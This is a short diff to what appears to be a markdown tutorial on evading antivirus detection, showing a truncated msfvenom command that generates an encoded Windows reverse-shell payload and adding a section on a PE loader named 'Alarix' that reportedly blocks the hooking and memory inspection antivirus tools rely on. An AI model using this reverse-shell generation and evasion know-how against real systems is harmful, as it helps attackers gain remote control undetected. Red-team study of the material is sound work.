@@ -57,3 +57,13 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip here> LPORT=<port here> -e x
 ![Alt Text](https://i.ibb.co/P9McckC/basic-msf-xor.png)
 
 Well we are making some progress now.
+
+
+### Using encryption (Alaris)
+Alarix is a protective PE file loader which does not allow any function hooking and in memory inspection whihch Avs use for detection.
+
+
+- Result
+
+![Alt Text](https://i.ibb.co/dMc2Zvg/alarix.png)
+
